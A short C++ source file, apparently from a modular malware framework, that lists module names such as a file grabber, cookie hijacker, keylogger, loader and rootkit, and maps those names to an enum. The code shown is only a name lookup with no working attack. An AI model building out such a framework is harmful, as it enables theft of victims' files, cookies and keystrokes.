#include "BaseModule.h"

const char * BaseModule::module_names[] = { "FILE_GRABBER",  "SCREEN_SHOOTER", "COOKIES_HIJACKER", "KEY_LOGGER", "LOADER", "ROOTKIT"};

supported_modules_enum BaseModule::supported_module_for_name(const std::string & module_name)
{
    for (unsigned i = 0; i < NUM_OF_MODULES; i++)
    {
        if(!strcmp(module_name.c_str(), BaseModule::module_names[i]))
        {
            return SupportedModules(i);
        }
    }
    return NUM_OF_MODULES;
}